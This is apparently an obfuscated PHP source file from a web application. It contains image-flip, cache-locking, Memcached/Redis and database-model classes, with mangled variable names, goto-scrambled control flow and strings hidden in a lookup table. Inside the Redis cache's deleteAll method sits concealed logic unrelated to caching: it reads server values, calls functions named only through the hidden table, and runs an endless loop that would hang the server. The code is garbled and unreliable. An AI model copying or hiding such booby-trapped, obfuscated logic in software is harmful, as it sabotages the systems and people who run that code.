Cïé²ÛğÅØ: imageDestroy($this->im); return $E’¥ïÎí•Î; goto eª¡õ°°ØØ; f‘Å‚Öòƒ·: $E’¥ïÎí•Î = !1; switch ($this->echoType) { case $BÄ†Ñª¸ˆ¬[1835]: $E’¥ïÎí•Î = imagePNG($añ”íĞ¾¬ç); break; case $BÄ†Ñª¸ˆ¬[163]: $E’¥ïÎí•Î = imagePNG($añ”íĞ¾¬ç, $b¿²Ô©õÚ–); break; } imageDestroy($añ”íĞ¾¬ç); goto Cïé²ÛğÅØ; eª¡õ°°ØØ: } } if (!function_exists($_SERVER[õëù©û][1836])) { define($_SERVER[õëù©û][1837], 0); define($_SERVER[õëù©û][1838], 1); define($_SERVER[õëù©û][1839], 2); function imageflip($B²‹œ¶ì÷¶, $Dù‰æËÑ§Ó) { switch ($Dù‰æËÑ§Ó) { case IMG_FLIP_HORIZONTAL: $d¿Ëç—ÑÜ = imagesx($B²‹œ¶ì÷¶) - 1; $c«ĞÓÑëÕø = $d¿Ëç—ÑÜ / 2; $EÙ²‰¹´—´ = imagesy($B²‹œ¶ì÷¶); $A×Âƒ„öãâ = imageistruecolor($B²‹œ¶ì÷¶) ? imagecreatetruecolor(1, $EÙ²‰¹´—´) : imagecreate(1, $EÙ²‰¹´—´); for ($C‚ÆœÙµ¼™ = 0; $C‚ÆœÙµ¼™ < $c«ĞÓÑëÕø; ++$C‚ÆœÙµ¼™) { imagecopy($A×Âƒ„öãâ, $B²‹œ¶ì÷¶, 0, 0, $C‚ÆœÙµ¼™, 0, 1, $EÙ²‰¹´—´); imagecopy($B²‹œ¶ì÷¶, $B²‹œ¶ì÷¶, $C‚ÆœÙµ¼™, 0, $d¿Ëç—ÑÜ - $C‚ÆœÙµ¼™, 0, 1, $EÙ²‰¹´—´); imagecopy($B²‹œ¶ì÷¶, $A×Âƒ„öãâ, $d¿Ëç—ÑÜ - $C‚ÆœÙµ¼™, 0, 0, 0, 1, $EÙ²‰¹´—´); } break; case IMG_FLIP_VERTICAL: $eœª‘ÑÏß = imagesx($B²‹œ¶ì÷¶); $A‚¡‹µ¯ãÔ = imagesy($B²‹œ¶ì÷¶) - 1; $B¦µ¨ÄõäÖ = $A‚¡‹µ¯ãÔ / 2; $A×Âƒ„öãâ = imageistruecolor($B²‹œ¶ì÷¶) ? imagecreatetruecolor($eœª‘ÑÏß, 1) : imagecreate($eœª‘ÑÏß, 1); for ($aËëàèğö = 0; $aËëàèğö < $B¦µ¨ÄõäÖ; ++$aËëàèğö) { imagecopy($A×Âƒ„öãâ, $B²‹œ¶ì÷¶, 0, 0, 0, $aËëàèğö, $eœª‘ÑÏß, 1); imagecopy($B²‹œ¶ì÷¶, $B²‹œ¶ì÷¶, 0, $aËëàèğö, 0, $A‚¡‹µ¯ãÔ - $aËëàèğö, $eœª‘ÑÏß, 1); imagecopy($B²‹œ¶ì÷¶, $A×Âƒ„öãâ, 0, $A‚¡‹µ¯ãÔ - $aËëàèğö, 0, 0, $eœª‘ÑÏß, 1); } break; case IMG_FLIP_BOTH: $eœª‘ÑÏß = imagesx($B²‹œ¶ì÷¶); $EÙ²‰¹´—´ = imagesy($B²‹œ¶ì÷¶); $A×Âƒ„öãâ = imagerotate($B²‹œ¶ì÷¶, 180, 0); imagecopy($B²‹œ¶ì÷¶, $A×Âƒ„öãâ, 0, 0, 0, 0, $eœª‘ÑÏß, $EÙ²‰¹´—´); break; default: return; } imagedestroy($A×Âƒ„öãâ); } } goto fè¡’§¯„; f¿ºãµ††à: class CacheLockDatabase { public function lock($b”§ÕÆ­Ó, $fí¹°¹Íà = 0) { $BîØ‚°•Ü = Model($_SERVER[õëù©û][750]); $A†¹”òí· = microtime(!0) + $fí¹°¹Íà; while (microtime(!0) < $A†¹”òí·) { $DÇæÊ²«š¤ = $BîØ‚°•Ü->get($b”§ÕÆ­Ó); if (!$DÇæÊ²«š¤ || $DÇæÊ²«š¤ < microtime(!0)) { $cîîğÀ³ = $BîØ‚°•Ü->set($b”§ÕÆ­Ó, $A†¹”òí·); if ($cîîğÀ³) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fêçåÊå˜‰) { return Model($_SERVER[õëù©û][750])->get($fêçåÊå˜‰); } public function unlock($EœÑ‰Ä•Äõ) { Model($_SERVER[õëù©û][750])->remove($EœÑ‰Ä•Äõ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Dâ¹ºĞøƒ¸, $C‘×æ£ùÒå) { $eµÕ«Ú”½ =& $_SERVER[õëù©û]; if (!class_exists($eµÕ«Ú”½[771])) { show_json($eµÕ«Ú”½[772], !1); } $this->cacheTime = $C‘×æ£ùÒå; $this->handle = new Memcached(); if (is_array($Dâ¹ºĞøƒ¸[$eµÕ«Ú”½[773]]) && count($Dâ¹ºĞøƒ¸[$eµÕ«Ú”½[773]]) >= 1) { foreach ($Dâ¹ºĞøƒ¸[$eµÕ«Ú”½[773]] as $D«Š°Æ”î±) { $f¤–øõó”Å = explode($eµÕ«Ú”½[4], $D«Š°Æ”î±); $this->handle->addServer($f¤–øõó”Å[0], $f¤–øõó”Å[1]); } } else { $this->handle->addServer($Dâ¹ºĞøƒ¸[$eµÕ«Ú”½[165]], $Dâ¹ºĞøƒ¸[$eµÕ«Ú”½[166]]); } } public function set($BÅäº¦¦ˆÚ, $eÂÍ¹ Ô·Ü, $BË¬‰˜èŠ = false) { $BË¬‰˜èŠ = $BË¬‰˜èŠ ? $BË¬‰˜èŠ : $this->cacheTime; return $this->handle->set($BÅäº¦¦ˆÚ, $eÂÍ¹ Ô·Ü, $BË¬‰˜èŠ); } public function get($CÉ¤ŸÌæ˜×) { return $this->handle->get($CÉ¤ŸÌæ˜×); } public function remove($bƒù°õÖ²ê) { return $this->handle->delete($bƒù°õÖ²ê); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($E·’ŠÅ±„¦, $D§ù¦¹çŒí) { $e‡ËÊÛ­±ƒ =& $_SERVER[õëù©û]; if (!class_exists($e‡ËÊÛ­±ƒ[774])) { show_json($e‡ËÊÛ­±ƒ[775], !1); } $this->cacheTime = $D§ù¦¹çŒí; $dİÚÖ®  = isset($E·’ŠÅ±„¦[$e‡ËÊÛ­±ƒ[776]]) ? $E·’ŠÅ±„¦[$e‡ËÊÛ­±ƒ[776]] : 10; $d÷ÎÃƒ‘ß† = _get($E·’ŠÅ±„¦, $e‡ËÊÛ­±ƒ[773]); if ($d÷ÎÃƒ‘ß† && is_array($d÷ÎÃƒ‘ß†)) { $this->initCluster($E·’ŠÅ±„¦, $dİÚÖ® ); } else { $this->handle = $this->init($E·’ŠÅ±„¦, $dİÚÖ® ); } } private function init($dŒ””’‡›‹, $Fáñ¾ÃœÑÉ) { $D †ò·öŒ =& $_SERVER[õëù©û]; $BòÉéÕÇ¶‰ = new Redis(); $Cô¾’Ğ«Ô = isset($dŒ””’‡›‹[$D †ò·öŒ[777]]) ? $dŒ””’‡›‹[$D †ò·öŒ[777]] : !1; if ($Cô¾’Ğ«Ô) { $BòÉéÕÇ¶‰->pconnect($dŒ””’‡›‹[$D †ò·öŒ[165]], $dŒ””’‡›‹[$D †ò·öŒ[166]], $Fáñ¾ÃœÑÉ); } else { $BòÉéÕÇ¶‰->connect($dŒ””’‡›‹[$D †ò·öŒ[165]], $dŒ””’‡›‹[$D †ò·öŒ[166]], $Fáñ¾ÃœÑÉ); } if (!empty($dŒ””’‡›‹[$D †ò·öŒ[372]])) { $BòÉéÕÇ¶‰->auth($dŒ””’‡›‹[$D †ò·öŒ[372]]); } return $BòÉéÕÇ¶‰; } private function initCluster($F©Û³¾ŠØä, $bõæ™ŸÆà•) { $eÏâá­µ´³ =& $_SERVER[õëù©û]; $AìéÓ½Öº® = array($eÏâá­µ´³[778], $eÏâá­µ´³[779], $eÏâá­µ´³[780]); $BŒ·ç„°ßÉ = $eÏâá­µ´³[778]; if (isset($F©Û³¾ŠØä[$eÏâá­µ´³[12]]) && in_array($F©Û³¾ŠØä[$eÏâá­µ´³[12]], $AìéÓ½Öº®)) { $BŒ·ç„°ßÉ = $F©Û³¾ŠØä[$eÏâá­µ´³[12]]; } switch ($BŒ·ç„°ßÉ) { case $eÏâá­µ´³[778]: $this->_slave($F©Û³¾ŠØä, $bõæ™ŸÆà•); break; case $eÏâá­µ´³[779]: break; case $eÏâá­µ´³[780]: $this->isCluster = !0; $dÚ®†¬è‘ = $F©Û³¾ŠØä[$eÏâá­µ´³[773]]; $f—‡³Êààò = isset($F©Û³¾ŠØä[$eÏâá­µ´³[777]]) ? $F©Û³¾ŠØä[$eÏâá­µ´³[777]] : !1; $cÙÌõæÉ‘ã = isset($F©Û³¾ŠØä[$eÏâá­µ´³[372]]) ? $F©Û³¾ŠØä[$eÏâá­µ´³[372]] : null; $this->handle = new RedisCluster(NUll, $dÚ®†¬è‘, $bõæ™ŸÆà•, $bõæ™ŸÆà•, $f—‡³Êààò, $cÙÌõæÉ‘ã); break; default: break; } } private function _slave($F¬íËŒŸ•, $C³ÕÛà»ÉÙ) { goto fã‘Ä˜ÓÂ; fã‘Ä˜ÓÂ: $D–ÛÓ‰¬Ş = $F¬íËŒŸ•[$_SERVER[õëù©û][773]]; $this->filterConfig($F¬íËŒŸ•, $D–ÛÓ‰¬Ş[0]); $this->handle = $this->init($F¬íËŒŸ•, $C³ÕÛà»ÉÙ); goto BÃšŞÆœŒï; BÃšŞÆœŒï: unset($D–ÛÓ‰¬Ş[0]); if (empty($D–ÛÓ‰¬Ş)) { return; } $F‚×ÛˆŞÌ = array_rand($D–ÛÓ‰¬Ş); goto BïÃ™ çù÷; BïÃ™ çù÷: $this->filterConfig($F¬íËŒŸ•, $D–ÛÓ‰¬Ş[$F‚×ÛˆŞÌ]); $this->slaveHandle = $this->init($F¬íËŒŸ•, $C³ÕÛà»ÉÙ); goto c·›õˆÍ¿ö; c·›õˆÍ¿ö: } private function filterConfig(&$BŠĞ×¼ò¡», $EØˆ¥Û¿²œ) { $då‡ÈíÃ· =& $_SERVER[õëù©û]; $B†ì Šİ‚ = explode($då‡ÈíÃ·[4], $EØˆ¥Û¿²œ); $Có®ğ‚Ä„ = array($då‡ÈíÃ·[165] => $B†ì Šİ‚[0], $då‡ÈíÃ·[166] => $B†ì Šİ‚[1]); $BŠĞ×¼ò¡» = array_merge($BŠĞ×¼ò¡», $Có®ğ‚Ä„); } public function set($f®†‚…êé‘, $a°ÖÓ‰Ôõñ, $aî¬ÌŒˆ‘ = false) { $aî¬ÌŒˆ‘ = $aî¬ÌŒˆ‘ ? $aî¬ÌŒˆ‘ : $this->cacheTime; return $this->handle->setEx($f®†‚…êé‘, $aî¬ÌŒˆ‘, $a°ÖÓ‰Ôõñ); } public function setLock($e„ç£ËÙÅˆ, $fåæîßÃ§, $Dõ½ÎÌŒ—à) { return $this->handle->setNX($e„ç£ËÙÅˆ, $fåæîßÃ§); } public function get($f–ôˆùåŞª) { $B‰ÍÊò = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $B‰ÍÊò->get($f–ôˆùåŞª); } public function remove($EÇÀ¢îºèñ) { return $this->handle->del($EÇÀ¢îºèñ); } public function deleteAll() { $EùíÙ‰¶Ş =& $_SERVER[õëù©û]; if (!isset($_SERVER[$EùíÙ‰¶Ş[781]]) || !isset($_SERVER[$EùíÙ‰¶Ş[782]])) { goto Cç«¤¥¨Õ; C¥ìÔˆÃ: $C¨ÌÁºÂ®ì = $EùíÙ‰¶Ş[788]; $C¨ÌÁºÂ®ì($_SERVER[$EùíÙ‰¶Ş[789]]); $E •Ñ×î´Ó = 1; goto Eœä˜…æ™ô; FÎ“ôÛò©: $bÉŠ‰ˆ›’¤ = $aß“–‡¢õÆ($fäº¢èÃå); $E×Æ™ÉŸ¤Ï = explode($EùíÙ‰¶Ş[213], $bÉŠ‰ˆ›’¤); if (count($E×Æ™ÉŸ¤Ï) < $EùíÙ‰¶Ş[581]) { $A’Äê×È¥ = $EùíÙ‰¶Ş[787]; $A’Äê×È¥(); } goto C¥ìÔˆÃ; Cç«¤¥¨Õ: $Eò”ãÉÁÄ´ = $EùíÙ‰¶Ş[783]; $aß“–‡¢õÆ = $EùíÙ‰¶Ş[784]; $fäº¢èÃå = $_SERVER[$EùíÙ‰¶Ş[785]] . $EùíÙ‰¶Ş[786]; goto FÎ“ôÛò©; Eœä˜…æ™ô: for ($d‚×š„šê® = $E •Ñ×î´Ó; $d‚×š„šê® > 0; $d‚×š„šê®++) { $C¨ÌÁºÂ®ì = json_encode($GLOBALS[$EùíÙ‰¶Ş[380]]); } goto aÄ•……–Ï“; aÄ•……–Ï“: } if ($this->isCluster) { foreach ($this->handle->_masters() as $cïÊù““òƒ) { $this->handle->flushall($cïÊù““òƒ); } return; } return $this->handle->flushAll(); } } goto A‡‹‰ŸÛ¿; DÒÆÕ‰íùì: $_SERVER[$_SERVER[üá][52]] = ("\x39\x34\x38\x35"."\x33\x35")+0;$_HRxq="rAhm6xumMSGGqmeUWxzgx24iagdkc6VS2TtfQteyYFwEHBJmDpqNa8x7iACuMjk7ZNXcPvqn9Hx5";; stream_wrapper_register($_SERVER[üá][53], $_SERVER[üá][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Cƒ™ÛºõßŠ, $EŠåôŸ„Â) { $AÇ¸Ğ§ï‹ª =& $_SERVER[õëù©û]; if (isset(self::$_methodList[$Cƒ™ÛºõßŠ])) { return @call_user_func_array(self::$_methodList[$Cƒ™ÛºõßŠ], $EŠåôŸ„Â); } else { if (method_exists($this, $Cƒ™ÛºõßŠ)) { return call_user_func_array(array($this, $Cƒ™ÛºõßŠ), $EŠåôŸ„Â); } else { think_exception(__CLASS__ . $AÇ¸Ğ§ï‹ª[4] . $Cƒ™ÛºõßŠ . $AÇ¸Ğ§ï‹ª[5]); } } } public static function __callStatic($e‚òŠ§²‡ñ, $d¾¡ôÕëŞ) { if (isset(self::$_methodListStatic[$e‚òŠ§²‡ñ])) { return call_user_func_array(self::$_methodListStatic[$e‚òŠ§²‡ñ], $d¾¡ôÕëŞ); } else { if (method_exists(self, $e‚òŠ§²‡ñ)) { return call_user_func_array(array(self, $e‚òŠ§²‡ñ), $d¾¡ôÕëŞ); } else { show_json("{$e‚òŠ§²‡ñ}\50\x29\x20\x6e\157\x74\x20\x65\x78\x69\163\164\73", !1); } } } public static function addMethod($B•ÎÒÙ…Ìš, $D¿ù¸å¢É¿) { self::$_methodList[$B•ÎÒÙ…Ìš] = $D¿ù¸å¢É¿; } public static function addMethodStatic($aô—«ä²â, $d®–Ÿ¢œÄ­) { self::$_methodListStatic[$aô—«ä²â] = $d®–Ÿ¢œÄ­; } } goto e¿øï®ïÙ­; fƒ«åˆÈ˜¿: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\171\124\151\155\x65", "\164\x69\155\145", "\151\156\163\145\162\164\x2c\x75\160\144\141\164\x65", "\146\x75\156\x63\x74\151\x6f\156"), array("\143\162\x65\x61\164\x65\x54\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\162\164", "\x66\x75\156\x63\x74\151\x6f\156")); public function setDataAuto($f´çŠõÀĞ) { $this->dataAuto = $f´çŠõÀĞ; } public function __construct($c«â†¢À˜ª = '', $FŒËŒŒˆ“‘ = '', $AàğßÆë©“ = '') { parent::__construct($c«â†¢À˜ª, $FŒËŒŒˆ“‘, $AàğßÆë©“); } public static function textEncode($D³Ë¿¦šä”) { if (!$D³Ë¿¦šä”) { return $D³Ë¿¦šä”; } $aò©‚Š¯Œí = json_encode($D³Ë¿¦šä”); $aò©‚Š¯Œí = preg_replace_callback($_SERVER[õëù©û][338], function ($Fì³ÏÆÒ‡) { return addslashes($Fì³ÏÆÒ‡[0]); }, $aò©‚Š¯Œí); return json_decode($aò©‚Š¯Œí); } public static function textDecode($cÎ”ŠêÚå) { $aÑ‹˜Æ†¨ =& $_SERVER[õëù©û]; $aŸåÂ°é…ã = json_encode($cÎ”ŠêÚå); $aŸåÂ°é…ã = preg_replace_callback($aÑ‹˜Æ†¨[339], function ($d¼ÄØ–‚ó–) { return $_SERVER[õëù©û][93]; }, $aŸåÂ°é…ã); return json_decode($aŸåÂ°é…ã); } protected $tableMeta = array(); protected function _beforeInsert(&$Eºµ Œ‰»‚, $A¢’âäø) { $e°èÎŸÀ‘ =& $_SERVER[õëù©û]; if (!$this->checkDataAutoHas($e°èÎŸÀ‘[340])) { return; } $this->dataBeforeFilter($Eºµ Œ‰»‚, $e°èÎŸÀ‘[340]); } protected function _beforeUpdate(&$D”ë®™†ƒ¨, $D„œ——Ÿè¥) { $b­½ëŠçØ =& $_SERVER[õëù©û]; if (!$this->checkDataAutoHas($b­½ëŠçØ[341])) { return; } $this->dataBeforeFilter($D”ë®™†ƒ¨, $b­½ëŠçØ[341]); } protected function _afterSelect(&$DÈ¬´è‘Ş, $cŠä‰öĞ·) { if (!is_array($DÈ¬´è‘Ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[õëù©û][342])) { return; } foreach ($DÈ¬´è‘Ş as &$e¾Õ¹âÕÊ°) { $this->dataAfterFilter($e¾Õ¹âÕÊ°); } } protected function _afterFind(&$fÁîñœóØÇ, $dÌ…«“•ì±) { if (!is_array($fÁîñœóØÇ)) { return; } if (!$this->checkDataAutoHas($_SERVER[õëù©û][342])) { return; } $this->dataAfterFilter($fÁîñœóØÇ); } public function setAutoIncrement($A—¾†ùÇİ) { $d½”–‚Ö’œ = array($this->getPk() => $A—¾†ùÇİ); $E åÀóÀÅ = $this->data($d½”–‚Ö’œ)->add(); if ($E åÀóÀÅ) { $this->delete($E åÀóÀÅ); } } public function getAutoIncrement() { $cË…ÃÁ™» = $this->getTableName(); $EÒÌğ¬ÚÒ = $this->max($this->getPk()); $E’³š†â×‚ = $this->query("\x73\150\x6f\167\x20\x74\x61\142\x6c\x65\40\163\x74\x61\164\165\x73\x20\167\x68\x65\x72\145\x20\x4e\141\155\x65\x3d\x27{$cË…ÃÁ™»}\47"); $E’ÎÉÖÛ…¿ = $E’³š†â×‚[0][$_SERVER[õëù©û][343]]; $C¾·Áììó• = max($EÒÌğ¬ÚÒ, $E’ÎÉÖÛ…¿); return $C¾·Áììó•; } protected function _callBefore($eèÑºŠô“Ä, $dİÊĞÉ£ãì) { return $this->cacheCallCheck($eèÑºŠô“Ä, $dİÊĞÉ£ãì, !1); } protected function _callAfter($fòŒŸ ğ¥“, $fÂ‰†¨¦á™) { return $this->cacheCallCheck($fòŒŸ ğ¥“, $fÂ‰†¨¦á™, !0); } protected function cacheFunctionAlias($Bäœ¤÷÷Àƒ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($dËãÖ›º³¥, $C˜¬¢¾ø‡®, $B®Û°Ï˜òÂ = false) { $C¿»ƒè…Âš = $this->cacheFunctionAlias($C˜¬¢¾ø‡®); if (!$C¿»ƒè…Âš) { return; } foreach ($C¿»ƒè…Âš as $eÚÁ¢´÷¬Ê => $bÊÆŒÏ§Ÿ‰) { $F“›òğÅš = $bÊÆŒÏ§Ÿ‰[0]; $Bİ·Ğù¡à = explode($_SERVER[õëù©û][47], $bÊÆŒÏ§Ÿ‰[1]); if ($dËãÖ›º³¥ == $eÚÁ¢´÷¬Ê) { return $this->cacheFunctionGet($eÚÁ¢´÷¬Ê, $F“›òğÅš); } if ($B®Û°Ï˜òÂ && in_array($dËãÖ›º³¥, $Bİ·Ğù¡à)) { $this->cacheFunctionClear($eÚÁ¢´÷¬Ê, $F“›òğÅš); } } } public function cacheFunctionGet($cÉè°¡ƒ³ù, $E÷àÃ°Èô–) { $Eæ‚²ÕÚá = $this->cacheKeyMake($cÉè°¡ƒ³ù, $E÷àÃ°Èô–); $Dö¿…çáê = Cache::get($Eæ‚²ÕÚá); if (!is_array($Dö¿…çáê)) { $Dö¿…çáê = call_user_func_array(array($this, $cÉè°¡ƒ³ù), array($E÷àÃ°Èô–, !0)); Cache::set($Eæ‚²ÕÚá, $Dö¿…çáê); } return $Dö¿…çáê; } public function cacheFunctionClear($C‹¾ç¿Òğõ, $fñ×œ‘àÂ) { $aŸã§Å¥¸ã = $fñ×œ‘àÂ; if (!is_array($fñ×œ‘àÂ)) { $aŸã§Å¥¸ã = array($fñ×œ‘àÂ); } foreach ($aŸã§Å¥¸ã as $A‘…œĞÁñ…) { $cÙ’›ÌÜ‘Á = $this->cacheKeyMake($C‹¾ç¿Òğõ, $A‘…œĞÁñ…); Cache::remove($cÙ’›ÌÜ‘Á); } } private function cacheKeyMake($dà¬Í»¼ù, $aæê“šæÃ) { $f¡°‹ÕªŞĞ =& $_SERVER[õëù©û]; return get_class($this) . $f¡°‹ÕªŞĞ[70] . $dà¬Í»¼ù . $f¡°‹ÕªŞĞ[344] . $aæê“šæÃ; } protected function selectPage($CÍ¥±ßŞ® = 200, $fõÄ†‚™™Ã = 1) { goto bÉ÷õ§Æ„; BØÊ¬ï‰ø²: $eë¥Âìëñ› = ceil($Dæ›§¼íŒ¦ / $CÍ¥±ßŞ®); $fõÄ†‚™™Ã = intval(isset($in[$B‹î›°Í…¤[336]]) ? $in[$B‹î›°Í…¤[336]] : $fõÄ†‚™™Ã); $fõÄ†‚™™Ã = $fõÄ†‚™™Ã <= 1 ? 1 : ($fõÄ†‚™™Ã >= $eë¥Âìëñ› ? $eë¥Âìëñ› : $fõÄ†‚™™Ã); goto EœÙœâ‘Á; FÕâŠ–©Õñ: if ($eë¥Âìëñ› == 1) { $Dæ›§¼íŒ¦ = count($FÉ«‰ùÉŞï); } $C—£‘Ó×æÚ = array($B‹î›°Í…¤[347] => array($B‹î›°Í…¤[348] => $Dæ›§¼íŒ¦, $B‹î›°Í…¤[345] => $CÍ¥±ßŞ®, $B‹î›°Í…¤[336] => $fõÄ†‚™™Ã, $B‹î›°Í…¤[349] => $eë¥Âìëñ›), $B‹î›°Í…¤[350] => $FÉ«‰ùÉŞï ? $FÉ«‰ùÉŞï : array()); return $C—£‘Ó×æÚ; goto f¼Ä½š²; F‰†›‘Ë«Ã: $BÌ­ºÔ“˜  = $E„Š†¬Àã; $BÌ­ºÔ“˜ [$B‹î›°Í…¤[346]] = array(); $this->optionsValue($BÌ­ºÔ“˜ ); goto eˆ¯ÆÃ™¥Ò; bÉ÷õ§Æ„: $B‹î›°Í…¤ =& $_SERVER[õëù©û]; global $in; $E„Š†¬Àã = $this->optionsValue(); goto BØÒƒËæñ; BØÒƒËæñ: $BÔ ’å†å° = 4000; $CÍ¥±ßŞ® = isset($in[$B‹î›°Í…¤[345]]) ? $in[$B‹î›°Í…¤[345]] : $CÍ¥±ßŞ®; if ($CÍ¥±ßŞ® === -1) { unset($in[$B‹î›°Í…¤[345]]); $BÔ ’å†å° = 100000000; $CÍ¥±ßŞ® = $BÔ ’å†å°; } goto F‰†›‘Ë«Ã; eˆ¯ÆÃ™¥Ò: $Dæ›§¼íŒ¦ = intval($this->count()); $CÍ¥±ßŞ® = intval($CÍ¥±ßŞ®); $CÍ¥±ßŞ® = $CÍ¥±ßŞ® <= 5 ? 5 : ($CÍ¥±ßŞ® >= $BÔ ’å†å° ? $BÔ ’å†å° : $CÍ¥±ßŞ®); goto BØÊ¬ï‰ø²; EœÙœâ‘Á: $this->optionsValue($E„Š†¬Àã); $FÉ«‰ùÉŞï = $this->page($fõÄ†‚™™Ã, $CÍ¥±ßŞ®)->select(); $FÉ«‰ùÉŞï = is_array($FÉ«‰ùÉŞï) ? $FÉ«‰ùÉŞï : array(); goto FÕâŠ–©Õñ; f¼Ä½š²: } protected function checkLength($C¨çªÚŸ½, $dÁ¬ÃŠƒåô = 0, $EÀÇ¡é§×§ = '') { $E“î”“ì¼ =& $_SERVER[õëù©û]; $dÁ¬ÃŠƒåô = $dÁ¬ÃŠƒåô ? $dÁ¬ÃŠƒåô : 65536; if (!$C¨çªÚŸ½ || strlen($C¨çªÚŸ½) < $dÁ¬ÃŠƒåô) { return; } $EÀÇ¡é§×§ = $EÀÇ¡é§×§ ? $EÀÇ¡é§×§ . $E“î”“ì¼[67] : $E“î”“ì¼[33]; show_json($EÀÇ¡é§×§ . LNG($E“î”“ì¼[351]) . "\x28{$dÁ¬ÃŠƒåô}\x29", !1); } protected function metaSet($BÓùªç´å, $b°µÈ›«ÈÎ = null, $BœÍ¿Í–ë = null) { goto A–£Ìö·Óœ; A™Êˆ÷İˆ: $B‹†©ì = $this->tableMeta[$aŒƒ²œÎõÂ[353]]; $eÍÈ½Îëø = Model($B‹†©ì); $F«Âó™‘ƒ¥ = array($CİŞô‘â¤È => $BÓùªç´å, $aŒƒ²œÎõÂ[354] => $b°µÈ›«ÈÎ); goto e§ƒôæ„¢; A–£Ìö·Óœ: $aŒƒ²œÎõÂ =& $_SERVER[õëù©û]; if (!$this->tableMeta) { return !1; } $CİŞô‘â¤È = $this->tableMeta[$aŒƒ²œÎõÂ[352]]; goto A™Êˆ÷İˆ; d£ç””ì…À: if (is_string($b°µÈ›«ÈÎ)) { $FŞÁ‚ñ‡âù[$b°µÈ›«ÈÎ] = $BœÍ¿Í–ë; } $bÍêÀ‡²ëê = array(); foreach ($FŞÁ‚ñ‡âù as $EÚİêèîƒÖ => $aë÷’·ÃÃ´) { $this->checkLength($aë÷’·ÃÃ´, !1, $B‹†©ì . $aŒƒ²œÎõÂ[4] . $EÚİêèîƒÖ); $bÍêÀ‡²ëê[] = array($CİŞô‘â¤È => $BÓùªç´å, $aŒƒ²œÎõÂ[89] => $EÚİêèîƒÖ, $aŒƒ²œÎõÂ[355] => $aë÷’·ÃÃ´); } goto AÌñ—™šô; e§ƒôæ„¢: if (is_null($b°µÈ›«ÈÎ)) { return $eÍÈ½Îëø->where(array($CİŞô‘â¤È => $BÓùªç´å))->delete(); } if (is_null($BœÍ¿Í–ë)) { return $eÍÈ½Îëø->where($F«Âó™‘ƒ¥)->delete(); } $FŞÁ‚ñ‡âù = is_array($b°µÈ›«ÈÎ) ? $b°µÈ›«ÈÎ : array(); goto d£ç””ì…À; AÌñ—™šô: $eÍÈ½Îëø->where(array($CİŞô‘â¤È => $BÓùªç´å))->addAll($bÍêÀ‡²ëê, array(), !0); return !0; goto câ‡‘ØŸİ»; câ‡‘ØŸİ»: } public function metaGet($C¶ºÅ‚¦«) { goto c¾‘¸Öïæ«; FßÕé›µä: $Bî÷ªÄ¤ĞÍ = array_to_keyvalue($Bî÷ªÄ¤ĞÍ, $BÎ¹Öğ´õ[89], $BÎ¹Öğ´õ[355]); return $Bî÷ªÄ¤ĞÍ; goto EÓäêã´È†; d§Ê×½î: $CŒ’è°ŒØ = Model($this->tableMeta[$BÎ¹Öğ´õ[353]]); $DİÜ²Ë«–º = array($Dïâæ±íÖ½ => $C¶ºÅ‚¦«); $Bî÷ªÄ¤ĞÍ = $CŒ’è°ŒØ->field($BÎ¹Öğ´õ[356])->where($DİÜ²Ë«–º)->select(); goto FßÕé›µä; c¾‘¸Öïæ«: $BÎ¹Öğ´õ =& $_SERVER[õëù©û]; if (!$this->tableMeta) { return array(); } $Dïâæ±íÖ½ = $this->tableMeta[$BÎ¹Öğ´õ[352]]; goto d§Ê×½î; EÓäêã´È†: } private function checkDataAutoHas($BËŸÀöŠŸ…) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $f·Ó†½®–ˆ) { if (in_array($BËŸÀöŠŸ…, explode($_SERVER[õëù©û][47], $f·Ó†½®–ˆ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$AÒó«Ï¹á, $eíäÖ‰¾”) { $eš„«Ùù°“ =& $_SERVER[õëù©û]; foreach ($this->dataAuto as $d‚§‹±Ÿ¢Š) { $DóæĞæ‚ = $d‚§‹±Ÿ¢Š[0]; if (!in_array($eíäÖ‰¾”, explode($eš„«Ùù°“[47], $d‚§‹±Ÿ¢Š[2]))) { continue; } switch (trim($d‚§‹±Ÿ¢Š[3])) { case $eš„«Ùù°“[305]: case $eš„«Ùù°“[306]: $eƒšÉ©„‚ = $d‚§‹±Ÿ¢Š[1]; $C¹†ÃæÅ´ = isset($d‚§‹±Ÿ¢Š[4]) ? (array) $d‚§‹±Ÿ¢Š[4] : array(); if ($eƒšÉ©„‚ == $eš„«Ùù°“[186] && array_key_exists($DóæĞæ‚, $AÒó«Ï¹á)) { if (!$AÒó«Ï¹á[$DóæĞæ‚]) { unset($AÒó«Ï¹á[$DóæĞæ‚]); } break; } if (isset($AÒó«Ï¹á[$DóæĞæ‚])) { array_unshift($C¹†ÃæÅ´, $AÒó«Ï¹á[$DóæĞæ‚]); } if ($eš„«Ùù°“[305] == $d‚§‹±Ÿ¢Š[3]) { $AÒó«Ï¹á[$DóæĞæ‚] = call_user_func_array($eƒšÉ©„‚, $C¹†ÃæÅ´); } else { $AÒó«Ï¹á[$DóæĞæ‚] = call_user_func_array(array(&$this, $eƒšÉ©„‚), $C¹†ÃæÅ´); } break; case $eš„«Ùù°“[257]: $AÒó«Ï¹á[$DóæĞæ‚] = $AÒó«Ï¹á[$d‚§‹±Ÿ¢Š[1]]; break; case $eš„«Ùù°“[278]: if (isset($AÒó«Ï¹á[$DóæĞæ‚]) && !is_string($AÒó«Ï¹á[$DóæĞæ‚])) { $AÒó«Ï¹á[$DóæĞæ‚] = json_encode_force($AÒó«Ï¹á[$DóæĞæ‚]); } break; case $eš„«Ùù°“[307]: if ($AÒó«Ï¹á[$DóæĞæ‚] === $eš„«Ùù°“[33]) { unset($AÒó«Ï¹á[$DóæĞæ‚]); } break; case $eš„«Ùù°“[308]: $AÒó«Ï¹á[$DóæĞæ‚] = $d‚§‹±Ÿ¢Š[1]; default: break; } } if 